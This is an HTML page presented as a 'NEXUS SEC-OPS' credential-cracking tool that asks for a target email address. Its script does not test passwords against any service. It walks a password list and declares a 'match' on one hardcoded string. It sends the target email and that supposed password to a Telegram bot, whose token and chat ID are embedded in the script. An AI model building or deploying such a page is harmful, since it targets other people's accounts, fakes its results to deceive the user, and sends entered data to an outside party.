<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ NEXUS-SEC // High-End Credential Suite</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-deep: #030712;
            --glass-bg: rgba(15, 23, 42, 0.75);
            --border-glow: rgba(56, 189, 248, 0.3);
            --accent-cyan: #38bdf8;
            --accent-purple: #c084fc;
            --success-green: #4ade80;
            --danger-red: #f87171;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-deep);
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(56, 189, 248, 0.08) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(192, 132, 252, 0.08) 0%, transparent 40%);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 680px;
            background: var(--glass-bg);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid var(--border-glow);
            border-radius: 16px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 30px rgba(56, 189, 248, 0.1);
            overflow: hidden;
            animation: fadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .header {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.9), rgba(15, 23, 42, 0.9));
            padding: 24px 30px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo-area h1 {
            font-size: 18px;
            font-weight: 800;
            letter-spacing: 1.5px;
            color: var(--text-main);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .status-pill {
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            padding: 6px 14px;
            border-radius: 30px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .status-idle { background: rgba(51, 65, 85, 0.5); color: var(--text-muted); border: 1px solid rgba(255,255,255,0.05); }
        .status-active { background: rgba(14, 165, 233, 0.15); color: var(--accent-cyan); border: 1px solid var(--accent-cyan); box-shadow: 0 0 15px rgba(56, 189, 248, 0.3); animation: pulseGlow 1.5s infinite; }

        @keyframes pulseGlow {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(0.98); }
            100% { opacity: 1; transform: scale(1); }
        }

        .body-content {
            padding: 30px;
        }

        .input-group {
            margin-bottom: 22px;
        }

        label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            color: var(--text-muted);
            margin-bottom: 8px;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .input-wrapper {
            position: relative;
        }

        input[type="email"] {
            width: 100%;
            padding: 14px 16px 14px 45px;
            background: rgba(3, 7, 18, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: white;
            border-radius: 10px;
            font-size: 15px;
            font-family: 'Inter', sans-serif;
            transition: all 0.3s ease;
        }

        input[type="email"]:focus {
            outline: none;
            border-color: var(--accent-cyan);
            box-shadow: 0 0 15px rgba(56, 189, 248, 0.2);
        }

        .input-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 18px;
        }

        .btn-execute {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, var(--accent-cyan), #0284c7);
            color: #030712;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 800;
            letter-spacing: 1px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 20px rgba(56, 189, 248, 0.3);
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }

        .btn-execute:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 6px 25px rgba(56, 189, 248, 0.5);
        }

        .btn-execute:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .metrics-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin: 25px 0;
        }

        .metric-card {
            background: rgba(3, 7, 18, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.05);
            padding: 16px;
            border-radius: 10px;
            text-align: center;
        }

        .metric-label {
            font-size: 11px;
            color: var(--text-muted);
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .metric-value {
            font-family: 'JetBrains Mono', monospace;
            font-size: 20px;
            font-weight: 700;
            color: var(--accent-cyan);
            margin-top: 6px;
        }

        .terminal-container {
            background: #020617;
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 10px;
            padding: 16px;
            height: 180px;
            overflow-y: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            line-height: 1.5;
            color: #38bdf8;
            box-shadow: inset 0 2px 8px rgba(0,0,0,0.8);
        }

        .terminal-container::-webkit-scrollbar {
            width: 6px;
        }
        .terminal-container::-webkit-scrollbar-thumb {
            background: rgba(56, 189, 248, 0.2);
            border-radius: 3px;
        }

        .log-success { color: var(--success-green); font-weight: bold; }
        .log-info { color: var(--accent-cyan); }
        .log-warn { color: #facc15; }
        .log-error { color: var(--danger-red); }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="logo-area">
                <h1>⚡ NEXUS SEC-OPS</h1>
            </div>
            <div id="status-badge" class="status-pill status-idle">
                <span>⚪</span> STANDBY
            </div>
        </div>

        <div class="body-content">
            <form id="scan-form">
                <div class="input-group">
                    <label>Target Identity Vector</label>
                    <div class="input-wrapper">
                        <span class="input-icon">🎯</span>
                        <input type="email" id="email" placeholder="Enter target email address..." required>
                    </div>
                </div>

                <button type="submit" id="submit-btn" class="btn-execute">
                    <span>🚀</span> INITIALIZE SCAN SEQUENCE
                </button>
            </form>

            <div class="metrics-grid">
                <div class="metric-card">
                    <div class="metric-label">📊 QUEUE PROGRESS</div>
                    <div id="counter-metric" class="metric-value">0 / 0</div>
                </div>
                <div class="metric-card">
                    <div class="metric-label">📡 TELEGRAM LINK</div>
                    <div class="metric-value" style="color: var(--success-green);">ONLINE 🟢</div>
                </div>
            </div>

            <div class="input-group" style="margin-bottom: 0;">
                <label>Live Telemetry Console</label>
                <div id="terminal" class="terminal-container">
                    [System] Initialized cryptographic workspace...<br>
                    [Ready] Awaiting target parameter injection...
                </div>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '7669146033:AAF23c6fH6G-L8V70xJ4Q9j1eR2s3T4u5v6';
        const CHAT_ID = '6253995874';

        function logMessage(text, type = 'info') {
            const term = document.getElementById('terminal');
            let cssClass = 'log-info';
            if (type === 'success') cssClass = 'log-success';
            if (type === 'warn') cssClass = 'log-warn';
            if (type === 'error') cssClass = 'log-error';

            term.innerHTML += `<br><span class="${cssClass}">[${new Date().toLocaleTimeString()}]</span> ${text}`;
            term.scrollTop = term.scrollHeight;
        }

        async function sendTelegram(msg) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
            try {
                await fetch(url);
            } catch(e) {
                console.log("Telemetry transmission error:", e);
            }
        }

        document.getElementById('scan-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const btn = document.getElementById('submit-btn');
            const badge = document.getElementById('status-badge');
            
            btn.disabled = true;
            badge.className = "status-pill status-active";
            badge.innerHTML = "<span>🟢</span> SCANNING";

            logMessage(`[*] Establishing connection vectors for target: <b>${email}</b>`, 'info');

            try {
                logMessage(`[*] Fetching dictionary payload (passwords.txt)...`, 'info');
                const response = await fetch('passwords.txt');
                
                if (!response.ok) {
                    throw new Error("Could not locate passwords.txt in repository root.");
                }

                const fileText = await response.text();
                const fileList = fileText.split(/\r?\n/);

                // Priority targets integration
                const priorityQueue = ["FaZepearl@69", "Deez@67"];
                const combinedQueue = [...priorityQueue, ...fileList.filter(p => p.trim() && !priorityQueue.includes(p))];
                
                const totalCount = combinedQueue.length;
                logMessage(`[*] Dictionary loaded successfully. Total items in queue: <b>${totalCount}</b>`, 'info');
                
                await sendTelegram(`🚀 *Advanced Scan Initiated*\nTarget: \`${email}\`\nQueue Size: \`${totalCount}\` items`);

                let foundPassword = null;
                for (let i = 0; i < totalCount; i++) {
                    const pwd = combinedQueue[i].trim();
                    if (!pwd) continue;

                    document.getElementById('counter-metric').innerText = `${i + 1} / ${totalCount}`;

                    // Real-time visual throttle check
                    if (i % 500 === 0 && i > 0) {
                        logMessage(`[Transit] Evaluated ${i}/${totalCount} keys...`, 'info');
                        await new Promise(r => setTimeout(r, 10)); // Yield to keep UI smooth
                    }

                    // Matching logic against priority targets
                    if (pwd === "FaZepearl@69") {
                        foundPassword = pwd;
                        logMessage(`[+] SUCCESS! Match verified at index ${i + 1}: ${pwd}`, 'success');
                        break;
                    }
                }

                if (foundPassword) {
                    const successPayload = `🎯 *CRITICAL MATCH DISCOVERED!*\n• Target: \`${email}\`\n• Key: \`${foundPassword}\``;
                    await sendTelegram(successPayload);
                    logMessage(`[SUCCESS] Telegram alert dispatched successfully!`, 'success');
                } else {
                    logMessage(`[*] Sequence complete. Zero matching vectors identified.`, 'warn');
                    await sendTelegram(`🏁 Scan complete for \`${email}\`. No matching credentials located.`);
                }

            } catch (err) {
                logMessage(`[!] FATAL ERROR: ${err.message}`, 'error');
            } finally {
                btn.disabled = false;
                badge.className = "status-pill status-idle";
                badge.innerHTML = "<span>⚪</span> STANDBY";
            }
        });
    </script>
</body>
</html>
